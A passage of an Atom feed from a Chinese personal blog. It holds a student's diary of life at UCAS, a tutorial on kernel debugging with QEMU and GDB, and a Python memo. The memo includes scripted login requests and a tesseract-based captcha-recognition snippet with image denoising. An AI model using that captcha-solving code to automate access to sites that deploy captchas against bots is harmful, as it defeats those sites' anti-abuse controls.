    <![CDATA[<p>本文记录了用QEMU构建最小Linux系统并进行调试的过程。</p>]]>
    
    </summary>
    
      <category term="Note" scheme="https://freemandealer.github.io/gallery/tags/Note/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[野长城]]></title>
    <link href="https://freemandealer.github.io/gallery/2015/10/01/the-wild-great-wall/"/>
    <id>https://freemandealer.github.io/gallery/2015/10/01/the-wild-great-wall/</id>
    <published>2015-10-01T09:07:59.000Z</published>
    <updated>2015-11-04T10:49:40.000Z</updated>
    <content type="html"><![CDATA[<p><img src="http://i11.tietuku.com/2acd988527e65ae4.jpg" alt=""></p>
<p>写一篇文章，纪录在国科大的见闻，给我的父母、姐姐和可能关心我近况的朋友们。</p>
<a id="more"></a>
<p>##1 遇见国科大<br>现在是报到的第二天，我在国科大的第一个早晨。昨天幸幸苦苦赶了一天路，但没想到起得出奇的早。吃完早饭才六点多，便忍不住逛了校园。自己真真实实地走了完整一圈，停在图书馆前仰头看，真是感动的无法言语。精心修剪的草坪加上宏伟的建筑，配上怀柔才有的蓝天——在现实里，还真是浮夸呀；这估计就是高考前幻想中大学校园，终于在我的研究生阶段遇见了。</p>
<p><img src="http://i11.tietuku.com/d095c57ba0c0eb15.jpg" alt=""></p>
<p>##2 怀柔<br>网上有人说怀柔是北京最后一片净土。是不是最后一片，我没有考证。但是在这里，我见到的星星比在之前呆过的任何地方都多。开学典礼上那个“脱口秀”马校长称赞这里是天然氧吧，我看并不过分。连续几天打开天气App，都是十几的PM2.5（不过截至到敲这段文字的时候，空气质量已经中度污染了）。不过我现在也不怎么关注什么App呢，直接看看周围的山色就知道今天能不能贪婪地呼吸空气了。</p>
<p><img src="http://i11.tietuku.com/f4180cb2a7da5049.png" alt=""></p>
<p>##3 爬野长城，并活着回来<br>室友们似乎开始进入了早睡早起的节奏了。现在是下午一点，一个个困得不行都在拉窗帘、锁门、睡午觉。楼道里遇见黄班长，兴奋地拉着我说要组队去爬野长城，希望叫上我们宿舍的伙伴们。</p>
<p>野长城的事情，不久前学校刚刚警告我们不要试图去爬。危险不说，上去会被抓，要拘留。我一想拘留就不用去上课了，所以就答应黄班长的邀请。毕竟第一次班级“组织活动”，我们宿舍就不参加，不是一个好开头。舍友张刚也是一个特别有责任感的同志，尽管鞋子没有干，也是困得不行，还是硬着头皮一同上路了。就这样，我的小米手环告诉我这一天我步行了20公里。</p>
<p>我没有去过真正的长城，看来我不是好汉。但是我去过野长城。我觉得野长城没什么不好，可能就是游人不多，入口的地方有可爱的大妈守着（大妈说反正你们不能从我这里过，不过前面还有一个口子可以上长城）。很多修行的人坐在古老的石道上参禅打坐，很安静。有一段石道长满杂草，很怀旧。</p>
<p><img src="/img/wild-wall.jpg" alt=""></p>
<p>##4 第一堂课<br>昨天校车刚进大门的时候，看到了气派的建筑群，就听到车里有同学尖叫说：好像国外学校！我想说，果壳大不仅是外表洋气，上起课来格调也是拽的不行。</p>
<p>第一堂课是数据挖掘，老师用英语上的，课程安排、作业什么的给人感觉就像从coursera里蹦出来的。美中不足的就是共有500个人选，但国科大最大的教室才300人（你们在干什么啊，讲台都要坐满了呀！）记得我六点半过去位子就没有了——上课时间是八点半。在写这篇文章时，我已经把这门课退了。</p>
<p><img src="http://i11.tietuku.com/582cfa7ff56d520d.jpg" alt=""></p>
<p>##5 国科大的老师<br>我这一个星期见到的院士比以往一生都多。因为我之前从来没有见过院士。而国科大的老师呢？可把我这个乡下孩子看傻眼了。</p>
<p>胡伟武老师，龙芯设计组组长。关于他的新闻，网上很多。我很喜欢上他的课，说得很有带入感，有技术背景喜欢发挥。更关键地是他一直和蔼地笑着讲课。加上他的课都是在晚上，让我回忆起大一晚上上马廷淮的C语言启蒙课的日子。</p>
<p>林惠民。听不懂啊听不懂啊听不懂啊。不仅不知道他在讲什么，关键是不知道他为什么讲这些。一查卧槽——中科院院士——怪不得跟不上他的思维境界。不管怎么样，写这篇文章时我已经把他的课退了。</p>
<p>杨力祥，操作系统老师，讲Linux内核的老师我都喜欢……他如果不吹牛的话。“我第一次赚大钱的时候”“买一个地球仪在办公室里转着看”“花了10年把计算机做到世界顶级”。</p>
<p>##6 释放能量<br>依山伴水，天然氧吧，跑跑步便是极好。健身房就在宿舍楼前，虽不精致却能激发荷尔蒙，一次4块也算便宜。操场就在窗外，踢踢球也很娱乐。在国科大呆一年身体如果虚弱了，那真是没救了。</p>
<p><img src="http://i11.tietuku.com/1cb1cfde387c0bb8.jpg" alt=""></p>
<p>##7 友好邻居爱串门<br>明天是国庆节:) </p>
<p>今天晚上可不能浪费。正巧遇见孟轲溜去二食堂就餐，我毫不犹豫地把他拽回一食堂。吃饭时说道上个星期摆脱他给我写的一个课程同步工具ucs出现了一些bug，吃完饭便拿了电脑去他宿舍单元找他解决问题。</p>
<p>推开门这货竟然坐在飘窗上谈吉他。飘窗上铺了毯子，放了一个颇有质感的大靠垫，也是很有孟博士该有的智慧和情调。然后我就一边听他弹琴，一边想办法让bug重现。大前研一在他的《一万小时天才理论》里曾经说过：如果路人辨认出了练习的曲子，那么他的练习方法就不正确。这样看来，孟轲是真的在练琴。</p>
<p>孟博士充满激情地调着代码，不时地说着冷笑话。我感觉很冷，我就开始玩我自己的电脑。突然想到前几天在群里聊“科学上网”认识的大神刘洪亮，约好有机会见面聊聊天来着，这不正好有空，还正好住在孟博士楼上，果断抱着电脑去串门，让孟轲一个人好好静一静，不要老分神讲冷笑话。</p>
<p>推开门一看，倒是他先认出了我：“这不是一个小时前上操作系统课上坐我旁边那哥们儿？”我的天，原来我要找的人坐我边上上了半个下午的课。刘洪亮东北辽宁人，不过我本科宿舍就有一哥们儿大庆的，我也不害怕。聊了几句，发现他果然是计算机网络方面的大神，随随便便就带我入门IPv6，把我的科学上网能力有带进步了一大截。他人有非常好，我随随便便就把他拉进我的粉丝群，并且拉着他帮我们一块儿做计算机网络小组作业。</p>
<p>回到孟轲宿舍，果不其然，他把bug都解决了。我非常感激，就把楼上刘洪亮刚刚教我的科学上网大法传授给了他。我们都很开心。</p>
<p>年轻人，就应该快乐地生活在一起，互相学习。学杂了才能学精。不然为什么要有大学呢？</p>
<p>##8 UCS上线!<br>今天是国庆节:)</p>
<p>也是ucs上线的大日子！昨天孟轲辛辛苦苦解决了所有已知bug，我不能藏着这个宝贝不分享，而是要让它发挥更大的作用。我做了一系列“最终”测试，重新整理了软件说明书，在11点20分向各大社交网络的群体广播了ucs“上线”的消息：</p>
<blockquote>
<p>国庆快乐!可是大家不要忘了写作业和学习！<br>推荐大家一个国科大课程材料同步工具UCS</p>
<p>懒得天天打开网页挨个下课件，所以求计算机学院孟轲同学帮我写了一份，热气腾腾，大家也试试吧：）</p>
<p>同时欢迎报告Bug，更欢迎大家贡献代码  <a href="https://github.com/tianxianbaobao/UCS" target="_blank" rel="external">https://github.com/tianxianbaobao/UCS</a></p>
</blockquote>
<p>消息一发送，收到了无数个赞。当然，用户反应的问题比赞多，更比想象中的多——这时我才意识到Beta测试是多么的重要。</p>
<p>计算所的同学群无疑是给我们支持最多的一个群体。小伙伴们早已不把自己当用户很多年，纷纷撸起袖子测试、watch、star、fork我们的项目，耐心细致地报告bug，甚至已经操刀为ucs增加新特性了。</p>
<p>其实我的github账号注册几年了，也用了很久了，可是作为我亲手初始化的项目，这是第一次受到怎么多（几十次，至少对于我来说是多的）访问。Issue、fork、branch这些功能，我原以为是可有可无的，是无聊的教课书才会涉及的，或是高手卖弄才学的，而现在它们正灵活地运用在实际项目中——虽然它就像麻雀那般小。</p>
<p>代码这些事大家一起玩真的很刺激！感谢孟轲感谢大家，并希望ucs能为大家带来些许的方便。</p>
<p>##9 对床风雨</p>
<p>##10 人文熏陶<br>如何提问</p>
<p>##11 离科学最近的地方</p>
<p>##12 红螺寺</p>
<p>##13 山顶小屋</p>
<p>##14 又一个好老师<br>科研，讲述ppt</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="http://i11.tietuku.com/2acd988527e65ae4.jpg" alt=""></p>
<p>写一篇文章，纪录在国科大的见闻，给我的父母、姐姐和可能关心我近况的朋友们。</p>]]>
    
    </summary>
    
      <category term="Life" scheme="https://freemandealer.github.io/gallery/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[用QEMU来调试内核 -- 道听途说篇]]></title>
    <link href="https://freemandealer.github.io/gallery/2015/08/27/debug-kernel-with-qemu/"/>
    <id>https://freemandealer.github.io/gallery/2015/08/27/debug-kernel-with-qemu/</id>
    <published>2015-08-27T01:28:12.000Z</published>
    <updated>2015-10-04T14:34:09.000Z</updated>
    <content type="html"><![CDATA[<p>在KernelNewbies列表上呆了两年了，问过几个问题，回答过几个问题，更多地是看高手对话，偷偷学艺。这几天人们在列表上谈论了如何QEMU调试内核的话题，我自己试了试，发现比用VMware调试强大很多(使用VMware调试内核请看<a href="http://freemandealer.github.io/2015/03/18/kernel-debugging/">之前文章</a>):</p>
<ul>
<li>简单、轻便，通过命令参数指定内核</li>
<li>编译出内核即能调试，不需要应用层</li>
<li>能调试诸多硬件平台(ARM/MIPS等等)</li>
</ul>
<p>下面是我从邮件中整理出的具体步骤，部分亲测。</p>
<a id="more"></a>
<h2 id="调试内核">调试内核</h2><h3 id="编译带调试信息的内核镜像">编译带调试信息的内核镜像</h3><p>首先我们得有一个被调试的内核二进制镜像。这个内核镜像必须是打开调试模式编译出来的，即内核配置中：</p>
<pre><code><span class="attribute">CONFIG_DEBUG_INFO</span>=<span class="string">y</span>
</code></pre><h3 id="运行内核">运行内核</h3><p>根据邮件原文，接着运行:</p>
<pre><code>qemu -s -S  -kernel <span class="keyword">arch</span>/x86/<span class="keyword">boot</span>/bzImage -<span class="keyword">append</span> <span class="string">"console=ttyS0"</span> -serial mon:stdio -nographic
</code></pre><p>或者</p>
<pre><code>qemu -s -S -smp <span class="number">1</span>,cores=<span class="number">1</span>  -hda /dev/zero -kernel arch/x86/boot/bzImage
</code></pre><p>就可以启动内核。但我在操作时，单独一个<code>qemu</code>并不是一个程序，而是：</p>
<pre><code>qemu-aarch64              qemu-mipsn32              qemu-system-i386        
qemu-aarch64-<span class="keyword">static</span>       qemu-mipsn32el            qemu-system-lm32        
qemu-<span class="built_in">alpha</span>                qemu-mipsn32el-<span class="keyword">static</span>     qemu-system-m68k        
qemu-<span class="built_in">alpha</span>-<span class="keyword">static</span>         qemu-mipsn32-<span class="keyword">static</span>       qemu-system-microblaze  
qemu-arm                  qemu-mips-<span class="keyword">static</span>          qemu-system-microblazeel
qemu-armeb                qemu-nbd                  qemu-system-mips        
qemu-armeb-<span class="keyword">static</span>         qemu-or32                 qemu-system-mips64      
qemu-arm-<span class="keyword">static</span>           qemu-or32-<span class="keyword">static</span>          qemu-system-mips64el    
qemu-cris                 qemu-ppc                  qemu-system-mipsel      
qemu-cris-<span class="keyword">static</span>          qemu-ppc64                qemu-system-moxie       
qemu-debootstrap          qemu-ppc64abi32           qemu-system-or32        
qemu-i386                 qemu-ppc64abi32-<span class="keyword">static</span>    qemu-system-ppc         
qemu-i386-<span class="keyword">static</span>          qemu-ppc64-<span class="keyword">static</span>         qemu-system-ppc64       
qemu-img                  qemu-ppc-<span class="keyword">static</span>           qemu-system-ppcemb      
qemu-io                   qemu-s390x                qemu-system-s390x       
qemu-m68k                 qemu-s390x-<span class="keyword">static</span>         qemu-system-sh4         
qemu-m68k-<span class="keyword">static</span>          qemu-sh4                  qemu-system-sh4eb       
qemu-make-debian-root     qemu-sh4eb                qemu-system-sparc       
qemu-microblaze           qemu-sh4eb-<span class="keyword">static</span>         qemu-system-sparc64     
qemu-microblazeel         qemu-sh4-<span class="keyword">static</span>           qemu-system-unicore32   
qemu-microblazeel-<span class="keyword">static</span>  qemu-sparc                qemu-system-x86_64      
qemu-microblaze-<span class="keyword">static</span>    qemu-sparc32plus          qemu-system-xtensa      
qemu-mips                 qemu-sparc32plus-<span class="keyword">static</span>   qemu-system-xtensaeb    
qemu-mips64               qemu-sparc64              qemu-unicore32          
qemu-mips64el             qemu-sparc64-<span class="keyword">static</span>       qemu-unicore32-<span class="keyword">static</span>   
qemu-mips64el-<span class="keyword">static</span>      qemu-sparc-<span class="keyword">static</span>         qemu-x86_64             
qemu-mips64-<span class="keyword">static</span>        qemu-system-<span class="built_in">alpha</span>         qemu-x86_64-<span class="keyword">static</span>      
qemu-mipsel               qemu-system-arm                                   
qemu-mipsel-<span class="keyword">static</span>        qemu-system-cris                                 
</code></pre><p>这么多<code>qemu-xxx</code>… 其中<code>qemu-system-xxx</code>是运行<code>xxx</code>硬件平台下整个操作系统的模拟器，比如我有一个x86_64平台的内核，那就使用下面命令运行之：</p>
<pre><code>qemu-system-x86_64 -s -S -kernel /boot/vmlinuz-<span class="number">3.13</span><span class="number">.0</span>-<span class="number">58</span>-generic -append <span class="string">"console=ttyS0"</span> -serial mon:stdio -nographic
</code></pre><h3 id="调试！">调试！</h3><p>接着就可以打开GDB进行连接、调试:</p>
<pre><code><span class="variable">$gdb</span> vmlinux
(gdb) target remote localhost:<span class="number">1234</span>
(gdb) b start_kernel
(gdb) c
</code></pre><h2 id="调试模块">调试模块</h2><p>qemu运行参数需要加上<code>-initrd　&lt;Your Init-RamDisk&gt;</code>选项，确保模块被安装。如果没有现成的initrd，那就做一个：</p>
<pre><code>sudo make modules_install
mkinitrdramfs -o initrd<span class="class">.img</span> -v &lt;your-version&gt;
</code></pre><p>接着使用下列命令载入模块符号：</p>
<pre><code>(gdb<span class="function">)</span><span class="instruction"> add-symbol-file </span>/home/aruna/kmod/misc.ko 0xffffffffa057e000 -s .data　0xffffffffa0580000 -s .bss 0xffffffffa05802c8
</code></pre><p>后面的那些地址可以通过如下命令查看:</p>
<pre><code>sudo cat /sys/<span class="class"><span class="keyword">module</span>/<span class="inheritance">&lt;<span class="parent">your</span></span>-<span class="title">module</span>&gt;/<span class="title">sections</span>/.<span class="title">text</span></span>
sudo cat /sys/<span class="class"><span class="keyword">module</span>/<span class="inheritance">&lt;<span class="parent">your</span></span>-<span class="title">module</span>&gt;/<span class="title">sections</span>/.<span class="title">data</span></span>
</code></pre><h2 id="其它平台">其它平台</h2><p>qemu不是虚拟机，而是一款模拟器。这意味着它可以模拟很多硬件平台。对于多种硬件平台的内核，只需选择对应的<code>qemu-system-xxx</code>即可。我恰巧有一块cubieboard的板子，电脑里有它的内核，那么我就这样运行这个内核:</p>
<pre><code>qemu-system-arm -machine cubieboard -s -S -kernel <span class="keyword">project</span><span class="regexp">/cubieboard/</span>linux-<span class="keyword">source</span>-<span class="number">3.4</span>.<span class="number">79</span>-sun7i<span class="regexp">/arch/</span>arm<span class="regexp">/boot/</span>zImage -<span class="keyword">append</span> <span class="string">"console=ttyS0"</span> -serial mon:stdio -nographic
</code></pre><p>可以看到多使用了<code>-machine</code>参数，来指定机器类型(是因为SoC的原因？)。</p>
<h2 id="出错处理">出错处理</h2><p>GDB报错：”Remote ‘g’ packet reply is too long”<br>处理办法<a href="http://lists.gnu.org/archive/html/qemu-discuss/2014-10/msg00069.html" target="_blank" rel="external">(参考这个)</a>：<br>下载GDB代码，修改remote.c文件注释下面两行:</p>
<pre><code><span class="number">6157</span>  <span class="comment">//if (buf_len &gt; 2 * rsa-&gt;sizeof_g_packet)</span>
<span class="number">6158</span>  <span class="comment">//  error (_("Remote 'g' packet reply is too long: %s"), rs-&gt;buf);</span>
</code></pre><p>然后重新编译安装GDB。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>在KernelNewbies列表上呆了两年了，问过几个问题，回答过几个问题，更多地是看高手对话，偷偷学艺。这几天人们在列表上谈论了如何QEMU调试内核的话题，我自己试了试，发现比用VMware调试强大很多(使用VMware调试内核请看<a href="http://freemandealer.github.io/2015/03/18/kernel-debugging/">之前文章</a>):</p>
<ul>
<li>简单、轻便，通过命令参数指定内核</li>
<li>编译出内核即能调试，不需要应用层</li>
<li>能调试诸多硬件平台(ARM/MIPS等等)</li>
</ul>
<p>下面是我从邮件中整理出的具体步骤，部分亲测。</p>]]>
    
    </summary>
    
      <category term="Note" scheme="https://freemandealer.github.io/gallery/tags/Note/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Python Tricks]]></title>
    <link href="https://freemandealer.github.io/gallery/2015/08/26/python-tricks/"/>
    <id>https://freemandealer.github.io/gallery/2015/08/26/python-tricks/</id>
    <published>2015-08-26T05:08:37.000Z</published>
    <updated>2016-07-17T08:31:13.000Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>开一篇博客作为Python备忘录</p>
</blockquote>
<a id="more"></a>
<h2 id="Python模拟浏览器登陆网站">Python模拟浏览器登陆网站</h2><p>方式一，使用httplib2模块:<a href="http://blog.csdn.net/five3/article/details/7079140" target="_blank" rel="external">参考资料</a></p>
<pre><code>http = httplib2.<span class="type">Http</span>()
myuri = <span class="symbol">'http</span>:<span class="comment">//www.2-vpn3.org/lr.action'</span>
mybody = {<span class="symbol">'user</span>.nick': <span class="symbol">'NAM</span>E', <span class="symbol">'user</span>.password': <span class="symbol">'PASSWOR</span>D',<span class="symbol">'validationCod</span>e': <span class="symbol">'VCOD</span>E'} 
myheaders = {<span class="symbol">'Content</span>-<span class="class"><span class="keyword">type</span>':</span> <span class="symbol">'application</span>/x-www-form-urlencoded'}
response, content = http.request(myuri, <span class="symbol">'POS</span>T', headers=myheaders,     body=urlencode(mybody))
myheaders = {<span class="symbol">'Cooki</span>e': response[<span class="symbol">'set</span>-cookie']}
myuri = <span class="symbol">'http</span>:<span class="comment">//www.2-vpn3.org/home!sl.action'</span>
response, content = http.request(uri=myuri, method=<span class="symbol">'GE</span>T', headers=myheaders)
</code></pre><p>方式二，使用urllib2模块:</p>
<pre><code><span class="keyword">import</span> urllib2
headers = {<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Linux; U; Android 2.3.6; zh-cn; GT-S5660 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 MicroMessenger/4.5.255'</span>}
req = urllib2.Request(url = <span class="string">'http://dict.youdao.com/search?q=manipulate&amp;keyfrom=dict.index'</span>, headers = headers)
res = urllib2.urlopen(req)
html = res.<span class="keyword">read</span>()
</code></pre><blockquote>
<p>Tip: 可以使用Chrome的开发者模式下Network工具来分析数据包。</p>
</blockquote>
<h2 id="Python正则表达式">Python正则表达式</h2><pre><code>ips = re.findall(<span class="string">r'\d+\.\d+\.\d+\.\d+'</span>, content) <span class="comment">#寻找ip地址，返回列表</span>

<span class="comment"># 判断record中是否包含日期 #</span>
<span class="keyword">if</span> re.search(<span class="string">'\[[0-9].[0-3]*[0-9]\]'</span>, record):
    do_something()
</code></pre><h2 id="Python验证码识别">Python验证码识别</h2><p>安装依赖库:</p>
<pre><code>sudo apt-get <span class="operator"><span class="keyword">install</span> python-pil
sudo apt-<span class="keyword">get</span> <span class="keyword">install</span> tesseract-ocr
sudo pip <span class="keyword">install</span> pytesserac</span>
</code></pre><p>使用:</p>
<pre><code>import pytesseract
from PIL import Image
image = Image.<span class="function"><span class="title">open</span><span class="params">(<span class="string">'vcode.jpg'</span>)</span></span>
vcode = pytesseract.<span class="function"><span class="title">image_to_string</span><span class="params">(image)</span></span>
</code></pre><p>预处理去噪：</p>
<pre><code># import Image
# import ImageFilter
img = Image.open(<span class="string">'vdcode_img.png'</span>)
img = img.convert(<span class="string">'RGB'</span>).<span class="keyword">filter</span>(ImageFilter.GaussianBlur)
pixdata = img.load()

<span class="keyword">for</span> y <span class="keyword">in</span> xrange(img.<span class="keyword">size</span>[<span class="number">1</span>]):
     <span class="keyword">for</span> x <span class="keyword">in</span> xrange(img.<span class="keyword">size</span>[<span class="number">0</span>]):
          <span class="keyword">if</span> pixdata[x,y][<span class="number">0</span>] &gt; <span class="number">220</span>:
               pixdata[x,y] = (<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>)


<span class="keyword">for</span> y <span class="keyword">in</span> xrange(img.<span class="keyword">size</span>[<span class="number">1</span>]):
      <span class="keyword">for</span> x <span class="keyword">in</span> xrange(img.<span class="keyword">size</span>[<span class="number">0</span>]):
          <span class="keyword">if</span> pixdata[x,y][<span class="number">1</span>] &gt; <span class="number">180</span>:
               pixdata[x,y] = (<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>)

<span class="keyword">for</span> y <span class="keyword">in</span> xrange(img.<span class="keyword">size</span>[<span class="number">1</span>]):
     <span class="keyword">for</span> x <span class="keyword">in</span> xrange(img.<span class="keyword">size</span>[<span class="number">0</span>]):
          <span class="keyword">if</span> pixdata[x,y][<span class="number">2</span>] &gt; <span class="number">220</span>:
               pixdata[x,y] = (<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>)

img.show()
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>开一篇博客作为Python备忘录</p>
</blockquote>]]>
    
    </summary>
    
      <category term="Note" scheme="https://freemandealer.github.io/gallery/tags/Note/"/>
    
  </entry>
  
</feed>
